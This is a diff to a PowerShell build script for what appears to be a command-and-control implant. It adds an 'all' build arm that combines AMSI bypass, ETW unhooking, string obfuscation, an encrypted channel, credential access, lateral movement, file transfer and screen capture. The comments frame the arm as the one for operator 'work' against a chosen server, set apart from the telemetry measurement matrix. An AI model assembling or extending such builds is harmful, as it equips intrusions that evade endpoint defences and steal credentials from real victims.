@@ -153,6 +153,27 @@ $arms = [ordered]@{
     'resilient' = @('PX_RESILIENT=1')
     'xfer'      = @('PX_FILE_TRANSFER=1', 'PX_SCREENSHOT=1')
     'caps'      = @('PX_CAPABILITIES=0x3FFFFF')
+    # Everything EXCEPT domain generation.
+    #
+    # The DGA arm REPLACES the C2 host with a generated name, so it
+    # cannot be pointed at an address -- which makes the 'full' arm
+    # awkward for the operator side, where you want to say "run this
+    # and point it at my server".
+    #
+    # This arm carries every other capability in one binary: the
+    # obfuscated strings, the AMSI bypass, the ETW unhook, the
+    # encrypted channel, the credential access, the lateral movement,
+    # the reconnect, the file transfer, the screen capture and the
+    # whole technique library.
+    #
+    # The cost of having them all at once is the same one the 'full'
+    # arm has: the telemetry is one blob, so you cannot tell which
+    # technique produced which signal. Use the matrix for the
+    # measurement and this arm for the work.
+    'all'       = @('PX_OBFUSCATE=1', 'PX_AMSI_BYPASS=1', 'PX_ETW_UNHOOK=1',
+                    'PX_ENCRYPT=1', 'PX_CRED_ACCESS=1',
+                    'PX_LATERAL=1', 'PX_RESILIENT=1', 'PX_FILE_TRANSFER=1',
+                    'PX_SCREENSHOT=1', 'PX_CAPABILITIES=0x3FFFFF')
     'full'      = @('PX_OBFUSCATE=1', 'PX_AMSI_BYPASS=1', 'PX_ETW_UNHOOK=1',
                     'PX_ENCRYPT=1', 'PX_DGA=1', 'PX_CRED_ACCESS=1',
                     'PX_LATERAL=1', 'PX_RESILIENT=1', 'PX_FILE_TRANSFER=1',
